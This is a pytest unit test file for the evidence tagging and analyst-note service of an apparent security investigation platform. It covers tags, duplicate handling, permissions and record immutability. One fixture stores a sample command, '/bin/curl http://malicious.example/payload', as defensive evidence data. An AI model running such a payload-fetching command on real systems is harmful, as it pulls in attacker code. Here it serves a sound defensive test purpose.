"""Unit tests for Evidence Tagging and Annotation service (Phase 2 Milestone 2.7)."""

from __future__ import annotations

import uuid
import pytest
from sqlalchemy.orm import Session

from backend.db.base import utcnow
from backend.db.models.app_user import AppUser
from backend.db.models.event import Event
from backend.db.models.host import Host
from backend.services.workspace import (
    AnnotationNotFoundError,
    AnnotationService,
    TagAssociationDuplicateError,
    TagDuplicateError,
    TagNotFoundError,
    WorkspacePermissionError,
)


@pytest.fixture
def annotation_service() -> AnnotationService:
    return AnnotationService()


@pytest.fixture
def test_host(contract_db_session: Session) -> Host:
    host = Host(hostname="evidence-host-1", ip_address="192.168.1.10")
    contract_db_session.add(host)
    contract_db_session.flush()
    return host


@pytest.fixture
def test_event(contract_db_session: Session, test_host: Host) -> Event:
    evt = Event(
        host_id=test_host.id,
        timestamp=utcnow(),
        source="process_collector",
        event_type="process_spawn",
        action="spawn",
        severity="medium",
        command="/bin/curl http://malicious.example/payload",
    )
    contract_db_session.add(evt)
    contract_db_session.flush()
    return evt


@pytest.fixture
def analyst_user(contract_db_session: Session) -> AppUser:
    user = AppUser(
        username="analyst_charlie",
        password_hash="fakehash",
        display_name="Analyst Charlie",
        role="analyst",
        is_active=True,
    )
    contract_db_session.add(user)
    contract_db_session.flush()
    return user


@pytest.fixture
def other_analyst_user(contract_db_session: Session) -> AppUser:
    user = AppUser(
        username="analyst_dave",
        password_hash="fakehash",
        display_name="Analyst Dave",
        role="analyst",
        is_active=True,
    )
    contract_db_session.add(user)
    contract_db_session.flush()
    return user


@pytest.fixture
def admin_user(contract_db_session: Session) -> AppUser:
    user = AppUser(
        username="admin_tagger",
        password_hash="fakehash",
        display_name="Admin Tagger",
        role="admin",
        is_active=True,
    )
    contract_db_session.add(user)
    contract_db_session.flush()
    return user


class TestEvidenceAnnotations:
    """Validate tag management, multi-tag associations, duplicate prevention, and notes."""

    def test_create_and_list_tags(
        self,
        contract_db_session: Session,
        annotation_service: AnnotationService,
        analyst_user: AppUser,
    ) -> None:
        tag1 = annotation_service.create_tag(
            contract_db_session,
            name="c2-communication",
            description="Network beaconing to known C2 server",
            color="#e06c75",
            category="network",
            user=analyst_user,
        )
        assert tag1.name == "c2-communication"
        assert tag1.category == "network"
        assert tag1.created_by_id == analyst_user.id

        # Listing tags shows association count 0
        tags = annotation_service.list_tags(contract_db_session)
        names = [t[0].name for t in tags]
        assert "c2-communication" in names
        tag_match = next(t for t in tags if t[0].name == "c2-communication")
        assert tag_match[1] == 0

    def test_create_duplicate_tag_rejected(
        self,
        contract_db_session: Session,
        annotation_service: AnnotationService,
        analyst_user: AppUser,
    ) -> None:
        annotation_service.create_tag(contract_db_session, name="lateral-movement", user=analyst_user)
        with pytest.raises(TagDuplicateError, match="already exists"):
            annotation_service.create_tag(contract_db_session, name="Lateral-Movement", user=analyst_user)

    def test_associate_and_disassociate_tags(
        self,
        contract_db_session: Session,
        annotation_service: AnnotationService,
        test_event: Event,
        test_host: Host,
        analyst_user: AppUser,
    ) -> None:
        tag = annotation_service.create_tag(
            contract_db_session, name="malicious-download", color="#d19a66", user=analyst_user
        )

        # Associate tag by ID
        assoc1 = annotation_service.associate_tag(
            contract_db_session,
            evidence_type="event",
            evidence_id=str(test_event.id),
            tag_id=tag.id,
            host_id=test_host.id,
            user=analyst_user,
        )
        assert assoc1.tag_id == tag.id
        assert assoc1.evidence_type == "event"
        assert assoc1.evidence_id == str(test_event.id)

        # Re-associating same tag raises duplicate error
        with pytest.raises(TagAssociationDuplicateError, match="already has tag"):
            annotation_service.associate_tag(
                contract_db_session,
                evidence_type="event",
                evidence_id=str(test_event.id),
                tag_id=tag.id,
                host_id=test_host.id,
                user=analyst_user,
            )

        # Associate a second tag by name (auto-creation)
        assoc2 = annotation_service.associate_tag(
            contract_db_session,
            evidence_type="event",
            evidence_id=str(test_event.id),
            tag_name="threat-actor-apt29",
            host_id=test_host.id,
            user=analyst_user,
        )
        assert assoc2.tag.name == "threat-actor-apt29"

        # List tags for evidence shows 2 tags
        active_tags = annotation_service.get_tags_for_evidence(
            contract_db_session, evidence_type="event", evidence_id=str(test_event.id)
        )
        assert len(active_tags) == 2

        # Check tag count in list_tags
        all_tags = annotation_service.list_tags(contract_db_session)
        mal_tag = next(t for t in all_tags if t[0].name == "malicious-download")
        assert mal_tag[1] == 1

        # Disassociate tag1
        removed = annotation_service.disassociate_tag(
            contract_db_session,
            tag_id=tag.id,
            evidence_type="event",
            evidence_id=str(test_event.id),
        )
        assert removed is True

        remaining_tags = annotation_service.get_tags_for_evidence(
            contract_db_session, evidence_type="event", evidence_id=str(test_event.id)
        )
        assert len(remaining_tags) == 1
        assert remaining_tags[0].tag.name == "threat-actor-apt29"

    def test_analyst_notes_lifecycle(
        self,
        contract_db_session: Session,
        annotation_service: AnnotationService,
        test_event: Event,
        test_host: Host,
        analyst_user: AppUser,
        other_analyst_user: AppUser,
        admin_user: AppUser,
    ) -> None:
        note1 = annotation_service.create_note(
            contract_db_session,
            evidence_type="event",
            evidence_id=str(test_event.id),
            text="Initial observation: suspicious outbound connection via curl.",
            host_id=test_host.id,
            user=analyst_user,
        )
        assert note1.id is not None
        assert note1.author_id == analyst_user.id
        assert "Initial observation" in note1.annotation_text

        note2 = annotation_service.create_note(
            contract_db_session,
            evidence_type="event",
            evidence_id=str(test_event.id),
            text="Corroborated with network firewall logs.",
            host_id=test_host.id,
            user=other_analyst_user,
        )

        notes = annotation_service.list_notes_for_evidence(
            contract_db_session, evidence_type="event", evidence_id=str(test_event.id)
        )
        assert len(notes) == 2
        assert notes[0].id == note1.id
        assert notes[1].id == note2.id

        # Dave cannot delete Charlie's note
        with pytest.raises(WorkspacePermissionError):
            annotation_service.delete_note(contract_db_session, note1.id, other_analyst_user)

        # Charlie deletes his note
        annotation_service.delete_note(contract_db_session, note1.id, analyst_user)

        # Admin can delete Dave's note
        annotation_service.delete_note(contract_db_session, note2.id, admin_user)

        remaining = annotation_service.list_notes_for_evidence(
            contract_db_session, evidence_type="event", evidence_id=str(test_event.id)
        )
        assert len(remaining) == 0

    def test_evidence_source_record_not_mutated(
        self,
        contract_db_session: Session,
        annotation_service: AnnotationService,
        test_event: Event,
        analyst_user: AppUser,
    ) -> None:
        """Tagging and annotating an evidence item must never mutate the original record."""
        orig_command = test_event.command
        orig_action = test_event.action
        orig_severity = test_event.severity

        tag = annotation_service.create_tag(contract_db_session, name="test-tag", user=analyst_user)
        annotation_service.associate_tag(
            contract_db_session,
            evidence_type="event",
            evidence_id=str(test_event.id),
            tag_id=tag.id,
            user=analyst_user,
        )
        annotation_service.create_note(
            contract_db_session,
            evidence_type="event",
            evidence_id=str(test_event.id),
            text="Analyst commentary",
            user=analyst_user,
        )

        contract_db_session.refresh(test_event)
        assert test_event.command == orig_command
        assert test_event.action == orig_action
        assert test_event.severity == orig_severity

    def test_update_tag_lifecycle(
        self,
        contract_db_session: Session,
        annotation_service: AnnotationService,
        analyst_user: AppUser,
    ) -> None:
        tag1 = annotation_service.create_tag(
            contract_db_session,
            name="initial-tag",
            description="Initial desc",
            color="#10b981",
            category="recon",
            user=analyst_user,
        )
        tag2 = annotation_service.create_tag(
            contract_db_session,
            name="conflict-tag",
            user=analyst_user,
        )

        # Successful update
        updated = annotation_service.update_tag(
            contract_db_session,
            tag_id=tag1.id,
            name="renamed-tag",
            description="Updated description",
            color="#3b82f6",
            category="malware",
            user=analyst_user,
        )
        assert updated.name == "renamed-tag"
        assert updated.description == "Updated description"
        assert updated.color == "#3b82f6"
        assert updated.category == "malware"

        # Duplicate name conflict
        with pytest.raises(TagDuplicateError, match="already exists"):
            annotation_service.update_tag(
                contract_db_session,
                tag_id=tag1.id,
                name="conflict-tag",
                user=analyst_user,
            )

        # Nonexistent tag
        with pytest.raises(TagNotFoundError):
            annotation_service.update_tag(
                contract_db_session,
                tag_id=uuid.uuid4(),
                name="some-tag",
                user=analyst_user,
            )

    def test_update_note_lifecycle_and_permissions(
        self,
        contract_db_session: Session,
        annotation_service: AnnotationService,
        test_event: Event,
        test_host: Host,
        analyst_user: AppUser,
        other_analyst_user: AppUser,
        admin_user: AppUser,
    ) -> None:
        note = annotation_service.create_note(
            contract_db_session,
            evidence_type="event",
            evidence_id=str(test_event.id),
            text="Original analyst hypothesis",
            host_id=test_host.id,
            user=analyst_user,
        )

        # Other analyst cannot update Charlie's note
        with pytest.raises(WorkspacePermissionError, match="do not have permission"):
            annotation_service.update_note(
                contract_db_session,
                note_id=note.id,
                text="Tampered note",
                user=other_analyst_user,
            )

        # Author can update note
        updated = annotation_service.update_note(
            contract_db_session,
            note_id=note.id,
            text="Confirmed outbound beaconing",
            user=analyst_user,
        )
        assert updated.annotation_text == "Confirmed outbound beaconing"
        assert updated.updated_at is not None

        # Admin can also update note
        admin_updated = annotation_service.update_note(
            contract_db_session,
            note_id=note.id,
            text="Admin verified and concluded",
            user=admin_user,
        )
        assert admin_updated.annotation_text == "Admin verified and concluded"

        # Nonexistent note raises AnnotationNotFoundError
        with pytest.raises(AnnotationNotFoundError):
            annotation_service.update_note(
                contract_db_session,
                note_id=uuid.uuid4(),
                text="Does not exist",
                user=analyst_user,
            )

    def test_unauthored_note_modification_and_deletion_rejected_for_regular_analyst(
        self,
        contract_db_session: Session,
        annotation_service: AnnotationService,
        test_event: Event,
        analyst_user: AppUser,
        admin_user: AppUser,
    ) -> None:
        """Notes without an author (system annotations) can only be modified or deleted by admins."""
        note = annotation_service.create_note(
            contract_db_session,
            evidence_type="event",
            evidence_id=str(test_event.id),
            text="Automated correlation note",
            user=None,
        )
        assert note.author_id is None

        # Analyst cannot modify or delete
        with pytest.raises(WorkspacePermissionError, match="permission"):
            annotation_service.update_note(
                contract_db_session,
                note_id=note.id,
                text="Tampered text",
                user=analyst_user,
            )

        with pytest.raises(WorkspacePermissionError, match="permission"):
            annotation_service.delete_note(contract_db_session, note_id=note.id, user=analyst_user)

        # Admin can modify and delete
        updated = annotation_service.update_note(
            contract_db_session,
            note_id=note.id,
            text="Admin adjusted text",
            user=admin_user,
        )
        assert updated.annotation_text == "Admin adjusted text"
        annotation_service.delete_note(contract_db_session, note_id=note.id, user=admin_user)


